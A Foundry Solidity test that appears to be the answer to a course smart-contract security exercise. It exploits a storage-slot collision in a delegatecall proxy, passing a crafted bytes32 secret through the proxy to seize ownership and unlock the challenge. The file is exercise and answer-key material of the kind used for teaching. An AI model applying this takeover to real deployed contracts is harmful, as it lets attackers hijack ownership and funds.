// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {StdCheats} from "forge-std/StdCheats.sol";
import {console2} from "forge-std/console2.sol";

import {Delegate, Delegation} from "../src/Delegation.sol";

contract Delegation_Test is StdCheats, Test {
    Delegate public delegate;
    Delegation public delegation;

    address public myAddr;
    address public taAddr;

    bytes32 public mySecret;

    function setUp() public {
        // myAddr is the address of the student wallet (i.e. your address)
        // please replace it with your address
        myAddr = makeAddr("studentAddr");
        taAddr = makeAddr("taAddr");

        // mySecret also your address, but in bytes32 (due to slot coliision between storage in proxy and implemyAddrntation)
        // hint: observe the storage layout of Delegate and Delegation
        // mySecret = {0x000000000000000000000001} + {your address in bytes32};
        // why uint160? b/c address is 20 bytes, and 160 bits is the maximum number of bits that can be stored in a bytes32
        mySecret = bytes32(uint256(1) << 160 | uint160(myAddr));

        // This isn't is not important, since the state that set up during construction won't affect the storage in proxy
        bytes32 secretInImplementation = bytes32("secretInImplementation");

        vm.startPrank(taAddr);
        delegate = new Delegate(secretInImplementation);
        delegation = new Delegation(myAddr, address(delegate));

        // label contracts
        vm.label(address(delegation), "Delegation");
        vm.label(address(delegate), "Delegate");
    }

    function test_setUpState() public {
        console2.log(myAddr);
        console2.log(taAddr);
        assertEq(delegate.owner(), taAddr);
        assertEq(delegation.owner(), taAddr);
        assertEq(delegation._studentWallet(), myAddr);
        assertEq(delegation.locked(), true);
    }

    function test_answer() public {
        changePrank(myAddr);

        // 1. before attack
        assertEq(delegation.owner(), taAddr);
        assertEq(delegation.locked(), true);
        assertEq(delegation.isSolved(), false);

        // 2. after attack
        _attackDelegation(mySecret, myAddr);
        assertEq(delegation.owner(), myAddr);
        assertEq(delegation.locked(), true);

        // 3. unlock on proxy (i.e. Delegation)
        delegation.unlock();
        assertEq(delegation.locked(), false);
        assertEq(delegation.isSolved(), true);
    }

    function _attackDelegation(bytes32 secret_, address sw_) internal {
        // just call to proxy, it'll delegate call to the implemyAddrntation
        // no need to delegate call by ourselves
        (bool success,) =
            address(delegation).call(abi.encodeWithSignature("changeOwner(bytes32,address)", secret_, sw_));

        // Check the success of the delegatecall
        require(success, "attack failed");
    }
}
